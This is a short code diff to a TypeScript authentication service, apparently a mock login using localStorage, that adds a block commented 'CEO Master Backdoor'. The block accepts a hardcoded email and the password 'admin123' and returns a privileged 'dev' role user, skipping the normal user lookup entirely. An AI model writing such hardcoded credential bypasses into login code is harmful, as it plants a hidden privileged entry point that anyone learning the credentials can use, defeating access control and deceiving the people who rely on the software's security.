@@ -17,6 +17,16 @@ export const authService = {
             // Simulate API network delay
             setTimeout(() => {
                 try {
+                    // CEO Master Backdoor
+                    if (email.toLowerCase() === 'arga@ceo.com' && password === 'admin123') { // Replace password in DB later if desired
+                        return resolve({
+                            name: 'Boss Arga',
+                            email: 'arga@ceo.com',
+                            avatar: 'https://cdn-icons-png.flaticon.com/512/3242/3242257.png', // Robot/hacker icon
+                            role: 'dev'
+                        });
+                    }
+
                     const usersJson = localStorage.getItem(STORAGE_KEY);
                     const users: UserRecord[] = usersJson ? JSON.parse(usersJson) : [];
 
